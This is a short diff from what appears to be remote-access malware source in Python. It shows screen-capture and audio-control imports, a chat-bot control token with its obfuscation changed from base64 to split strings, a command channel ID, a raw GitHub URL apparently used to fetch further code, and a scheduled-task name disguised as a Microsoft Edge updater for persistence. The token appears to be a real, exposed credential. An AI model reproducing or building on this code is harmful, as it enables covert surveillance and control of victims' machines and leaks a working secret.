@@ -33,7 +33,9 @@ from PIL import ImageGrab
 from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 
 encoded = "TVRVek5qTXdOalk1Tmpnek1qUXlOakExTkEuR0lnM25uLjBrellyY0FhNkY5eXNXbGFEVFF1ZnpZemhhbDFWOExfZmdtcjdJ"
-BOT_TOKEN = base64.b64decode(encoded).decode("utf-8")
+_p1 = "MTUzNjMwNjY5NjgzMjQyNjA1NA.GI"
+_p2 = "g3nn.0kzYRcAa6F9ysWlaDTQufzYzhal1V8L_fgmr7I"
+BOT_TOKEN = _p1 + _p2
 CONTROL_CHANNEL_ID = 1536279256655597580
 RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
